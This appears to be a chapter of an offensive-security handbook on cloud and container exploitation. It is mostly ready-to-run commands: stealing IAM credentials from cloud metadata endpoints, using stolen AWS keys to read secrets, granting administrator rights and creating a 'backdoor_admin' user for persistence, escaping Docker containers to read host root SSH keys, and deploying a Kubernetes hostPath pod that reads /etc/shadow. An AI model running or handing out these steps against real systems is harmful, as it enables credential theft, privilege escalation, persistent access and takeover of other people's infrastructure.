# VOLUME VI — Cloud & Modern Infrastructure

> *"The perimeter is gone. The new perimeter is identity."*

---

## Chapter 1: Cloud Environment Awareness

Before trying any cloud exploit, identify where you are. The attack chain is completely different depending on the environment.

### 1.1 — Identifying the Cloud Provider

```bash
# From a shell on the compromised host:
# AWS
curl -s http://169.254.169.254/latest/meta-data/placement/region

# GCP
curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/project/project-id

# Azure
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Check from environment variables
env | grep -iE 'aws|azure|gcp|google|cloud'
```

---

## Chapter 2: AWS Exploitation

### 2.1 — IMDSv1 vs IMDSv2 (SSRF & Cloud Metadata)
**IMDSv1 (The Classic):** No authentication, just send a request:
```bash
# Via SSRF in the web app:
# http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Via shell on EC2:
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Returns the role name, then:
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
# Returns: AccessKeyId, SecretAccessKey, Token → Use with AWS CLI!
```

**IMDSv2 (Hardened — Requires a Token First):**
```bash
# Step 1: Get a session token
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Step 2: Use the token in all subsequent metadata requests
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### 2.2 — Abusing Stolen AWS Credentials
Once you have `AccessKeyId`, `SecretAccessKey`, `Token`:
```bash
# Set them up in the CLI
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=abc123...
export AWS_SESSION_TOKEN=FQo...

# Enumerate who you are
aws sts get-caller-identity

# List S3 buckets
aws s3 ls

# Access environment secrets
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id /prod/database/password

# Enumerate lambda functions (may contain hardcoded secrets in env vars)
aws lambda list-functions
aws lambda get-function-configuration --function-name FUNCTION_NAME
```

### 2.3 — IAM Privilege Escalation
If the stolen role has `iam:*` or specific permissions:
```bash
# Check your current permissions
aws iam list-attached-user-policies --user-name USER
aws iam get-policy-version --policy-arn ARN --version-id v1

# Add an Administrator policy to yourself
aws iam attach-user-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --user-name USER

# Create a new admin user for persistence
aws iam create-user --user-name backdoor_admin
aws iam attach-user-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --user-name backdoor_admin
aws iam create-access-key --user-name backdoor_admin
```

---

## Chapter 3: Docker Exploitation

### 3.1 — Identifying You Are in a Container
```bash
# Check for the .dockerenv file at root
ls /.dockerenv

# Check cgroup (container-specific process IDs)
cat /proc/1/cgroup | grep docker

# Check hostname (often random hash)
hostname
```

### 3.2 — Docker Escape Techniques

**Privileged Container (`--privileged`):**
If the container was launched with `--privileged`, it has full device access:
```bash
# Mount the host's root filesystem
fdisk -l  # Find the host disk (e.g., /dev/sda)
mkdir /mnt/host
mount /dev/sda1 /mnt/host
ls /mnt/host  # You now have the host's filesystem!

# Read the host's SSH keys and connect as root
cat /mnt/host/root/.ssh/id_rsa
```

**Docker Socket Mounted:**
If `/var/run/docker.sock` is mounted inside the container:
```bash
# Create a new privileged container mounting host root
docker -H unix:///var/run/docker.sock run -v /:/host --rm -it alpine chroot /host sh
```

---

## Chapter 4: Kubernetes (K8s) Exploitation

### 4.1 — Identifying a K8s Environment
```bash
# Check for the service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Check for the Kubernetes API
env | grep KUBERNETES
```

### 4.2 — Accessing the Kubernetes API
```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
APISERVER=https://kubernetes.default.svc

# Who are you in the cluster?
curl -s --cacert $CACERT --header "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces

# List pods in current namespace
curl -s --cacert $CACERT --header "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/default/pods
```

### 4.3 — Container Escape via K8s
If your service account has `pods/exec` or `create pods` permissions:
```bash
# Create a privileged pod mounting the host filesystem for full escape
kubectl --token=$TOKEN apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: escape-pod
spec:
  containers:
  - name: escape
    image: alpine
    command: ["/bin/sh", "-c", "cat /host/etc/shadow"]
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
  hostPID: true
  hostNetwork: true
EOF
```
